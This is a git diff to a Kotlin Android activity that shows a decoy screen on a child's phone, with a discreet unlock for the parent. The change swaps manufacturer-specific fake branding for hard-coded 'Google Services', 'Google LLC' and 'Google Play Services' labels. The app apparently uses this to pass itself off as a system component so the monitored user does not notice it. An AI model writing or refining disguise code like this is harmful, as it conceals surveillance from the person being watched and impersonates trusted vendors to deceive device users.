@@ -56,24 +56,12 @@ class DecoyDisplayActivity : AppCompatActivity() {
         val tvDeviceModel = findViewById<TextView>(R.id.tvDeviceModel)
         val tvFirmwareSubsystem = findViewById<TextView>(R.id.tvFirmwareSubsystem)
 
-        // Dynamic OEM details matching the child's exact physical phone
-        val isVivo = Build.MANUFACTURER.contains("vivo", ignoreCase = true)
-        val brandName = if (isVivo) "vivo" else Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
-        
-        tvDecoyTitle?.text = "$brandName services"
-        tvDecoyHeader?.text = "$brandName services"
-        tvDeviceBrand?.text = brandName
-        tvDeviceModel?.text = Build.MODEL
-        
-        val osFlavor = when {
-            isVivo || Build.MANUFACTURER.contains("iqoo", ignoreCase = true) -> "FuntouchOS Core Subsystem"
-            Build.MANUFACTURER.contains("samsung", ignoreCase = true) -> "OneUI Core Framework"
-            Build.MANUFACTURER.contains("xiaomi", ignoreCase = true) || Build.MANUFACTURER.contains("redmi", ignoreCase = true) || Build.MANUFACTURER.contains("poco", ignoreCase = true) -> "HyperOS Core Services"
-            Build.MANUFACTURER.contains("oppo", ignoreCase = true) || Build.MANUFACTURER.contains("realme", ignoreCase = true) || Build.MANUFACTURER.contains("oneplus", ignoreCase = true) -> "ColorOS Subsystem"
-            else -> "Android Hardware Subsystem"
-        }
-        tvFirmwareSubsystem?.text = osFlavor
-        tvDecoyFooter?.text = "$brandName Hardware Component Subsystem"
+        tvDecoyTitle?.text = "Google Services"
+        tvDecoyHeader?.text = "Google Services"
+        tvDeviceBrand?.text = "Google LLC"
+        tvDeviceModel?.text = "Android ${Build.VERSION.RELEASE}"
+        tvFirmwareSubsystem?.text = "Google Play & System Sync"
+        tvDecoyFooter?.text = "Google Play Services • Core Synchronization"
 
         // 1. Discreet corner unlock
         ivParentUnlock.setOnClickListener {
